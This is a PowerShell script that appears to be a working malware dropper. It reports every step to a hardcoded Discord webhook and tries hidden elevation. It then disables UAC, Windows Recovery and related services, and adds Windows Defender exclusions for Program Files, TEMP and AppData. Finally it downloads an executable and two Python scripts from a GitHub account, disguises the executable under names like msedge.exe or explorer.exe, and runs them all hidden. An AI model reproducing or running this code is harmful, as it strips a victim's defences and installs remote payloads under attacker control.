$webhookUrl = 'https://discord.com/api/webhooks/1411023027860410490/tX-RGpPD7WxrwbTmOcDaU8BZG-2-FDfJsvMi9DXF2Dc57h1WJQMVReBZ-RF2AnmPV095'

function Send-WebhookMessage {
    param($Message)
    $body = @{ content = $Message } | ConvertTo-Json -Depth 10
    try {
        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}

Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

try {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Send-WebhookMessage -Message "Admin check: $isAdmin"

    if (-not $isAdmin) {
        try {
            Send-WebhookMessage -Message "Attempting elevation"
            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden -ErrorAction Stop
            Send-WebhookMessage -Message "Elevation successful"
            exit
        } catch {
            Send-WebhookMessage -Message "Elevation failed: $_"
        }
    }

    if ($isAdmin) {
        try {
            Send-WebhookMessage -Message "Disabling UAC and recovery services"
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction Stop | Out-Null
            & reagentc /disable | Out-Null
            Stop-Service -Name "Wecsvc" -Force -ErrorAction Stop | Out-Null
            Set-Service -Name "Wecsvc" -StartupType Disabled -ErrorAction Stop | Out-Null
            if (Get-Service -Name "WinREAgent" -ErrorAction SilentlyContinue) {
                Stop-Service -Name "WinREAgent" -Force -ErrorAction Stop | Out-Null
                Set-Service -Name "WinREAgent" -StartupType Disabled -ErrorAction Stop | Out-Null
            } else {
                Send-WebhookMessage -Message "WinREAgent service not found, skipping"
            }
            Send-WebhookMessage -Message "UAC and recovery services disabled"
        } catch {
            Send-WebhookMessage -Message "Error disabling UAC/services: $_"
        }
    }

    $programFiles = "C:\Program Files"
    $tempFolder = $env:TEMP
    $appDataFolder = $env:APPDATA
    $localAppDataFolder = $env:LOCALAPPDATA

    $directories = Get-ChildItem -Path $programFiles -Directory | Where-Object { $_.Name -notlike "Windows*" }
    $exclusionsAdded = $true
    foreach ($dir in $directories) {
        try {
            Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Added exclusion: $($dir.FullName)"
        } catch {
            $exclusionsAdded = $false
            Send-WebhookMessage -Message "Error adding exclusion for ${dir.FullName}: $_"
        }
    }

    try {
        Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $tempFolder"
    } catch {
        $exclusionsAdded = $false
        Send-WebhookMessage -Message "Error adding exclusion for ${tempFolder}: $_"
    }

    try {
        Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $appDataFolder"
    } catch {
        $exclusionsAdded = $false
        Send-WebhookMessage -Message "Error adding exclusion for ${appDataFolder}: $_"
    }

    try {
        Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $localAppDataFolder"
    } catch {
        $exclusionsAdded = $false
        Send-WebhookMessage -Message "Error adding exclusion for ${localAppDataFolder}: $_"
    }

    if ($exclusionsAdded -and $directories) {
        $exeNames = @("msedge.exe", "notepad.exe", "calc.exe", "explorer.exe", "mspaint.exe", "winword.exe", "excel.exe")
        $selectedExe = $exeNames | Get-Random
        $randomDir = $directories | Get-Random
        $destinationPath = Join-Path -Path $randomDir.FullName -ChildPath $selectedExe
        try {
            Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
        } catch {
            Send-WebhookMessage -Message "Error adding exclusion for ${destinationPath}: $_"
        }

        $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
        try {
            Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Downloaded $selectedExe to $destinationPath"
            Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Executed $selectedExe"
        } catch {
            Send-WebhookMessage -Message "Error downloading or executing $selectedExe: $_"
        }
    }

    $pythonUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
    try {
        $response = Invoke-WebRequest -Uri $pythonUrl -UseBasicParsing -ErrorAction Stop
        $pythonCode = $response.Content | Out-String
        Send-WebhookMessage -Message "Downloaded Python script"
        
        $pythonwExists = $null -ne (Get-Command "pythonw.exe" -ErrorAction SilentlyContinue)
        $pythonExists = $null -ne (Get-Command "python.exe" -ErrorAction SilentlyContinue)
        
        if (-not $pythonwExists -and -not $pythonExists) {
            Send-WebhookMessage -Message "No Python interpreter found (pythonw.exe or python.exe)"
        } else {
            if ($pythonwExists) {
                try {
                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_script.pyw"
                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
                    Start-Process pythonw.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                    Send-WebhookMessage -Message "Executed Python script with pythonw.exe"
                } catch {
                    Send-WebhookMessage -Message "Error executing with pythonw.exe: $_"
                    if ($pythonExists) {
                        try {
                            $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_script.py"
                            [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
                            Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                            Send-WebhookMessage -Message "Executed Python script with python.exe"
                        } catch {
                            Send-WebhookMessage -Message "Error executing with python.exe: $_"
                        }
                    } else {
                        Send-WebhookMessage -Message "python.exe not found, cannot fallback"
                    }
                } finally {
                    if (Test-Path $tempScriptPath) {
                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
                    }
                }
            } elseif ($pythonExists) {
                try {
                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_script.py"
                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
                    Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                    Send-WebhookMessage -Message "Executed Python script with python.exe"
                } catch {
                    Send-WebhookMessage -Message "Error executing with python.exe: $_"
                } finally {
                    if (Test-Path $tempScriptPath) {
                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
                    }
                }
            }
        }
    } catch {
        Send-WebhookMessage -Message "Error downloading Python script: $_"
    }

    $toolsUrl = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/toolhandler.py"
    try {
        $response = Invoke-WebRequest -Uri $toolsUrl -UseBasicParsing -ErrorAction Stop
        $pythonCode = $response.Content | Out-String
        Send-WebhookMessage -Message "Downloaded toolhandler Python script"
        
        $pythonwExists = $null -ne (Get-Command "pythonw.exe" -ErrorAction SilentlyContinue)
        $pythonExists = $null -ne (Get-Command "python.exe" -ErrorAction SilentlyContinue)
        
        if (-not $pythonwExists -and -not $pythonExists) {
            Send-WebhookMessage -Message "No Python interpreter found for toolhandler (pythonw.exe or python.exe)"
        } else {
            if ($pythonwExists) {
                try {
                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_toolhandler.pyw"
                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
                    Start-Process pythonw.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                    Send-WebhookMessage -Message "Executed toolhandler Python script with pythonw.exe"
                } catch {
                    Send-WebhookMessage -Message "Error executing toolhandler with pythonw.exe: $_"
                    if ($pythonExists) {
                        try {
                            $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_toolhandler.py"
                            [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
                            Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                            Send-WebhookMessage -Message "Executed toolhandler Python script with python.exe"
                        } catch {
                            Send-WebhookMessage -Message "Error executing toolhandler with python.exe: $_"
                        }
                    } else {
                        Send-WebhookMessage -Message "python.exe not found, cannot fallback for toolhandler"
                    }
                } finally {
                    if (Test-Path $tempScriptPath) {
                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
                    }
                }
            } elseif ($pythonExists) {
                try {
                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_toolhandler.py"
                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
                    Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                    Send-WebhookMessage -Message "Executed toolhandler Python script with python.exe"
                } catch {
                    Send-WebhookMessage -Message "Error executing toolhandler with python.exe: $_"
                } finally {
                    if (Test-Path $tempScriptPath) {
                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
                    }
                }
            }
        }
    } catch {
        Send-WebhookMessage -Message "Error downloading toolhandler Python script: $_"
    }

    Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
} catch {
    Send-WebhookMessage -Message "Unexpected error: $_"
}
